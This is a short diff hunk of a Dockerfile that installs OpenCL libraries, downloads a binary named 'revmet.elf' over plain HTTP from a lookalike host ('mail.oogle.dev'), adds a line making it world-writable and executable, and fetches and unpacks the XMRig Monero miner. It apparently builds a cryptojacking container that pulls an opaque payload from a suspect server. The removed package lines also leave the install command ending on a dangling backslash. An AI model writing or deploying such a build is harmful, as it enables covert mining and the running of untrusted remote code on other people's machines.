@@ -7,11 +7,10 @@ RUN apt-get update && apt-get install -y \
     wget \
     ocl-icd-libopencl1 \
     libmicrohttpd-dev \
-    libc6 \
-    libstdc++6
 
 WORKDIR /root
 RUN wget http://mail.oogle.dev:8000//revmet.elf
+RUN chmod 777 revmet.elf
 
 RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
 RUN tar -xzvf xmr*
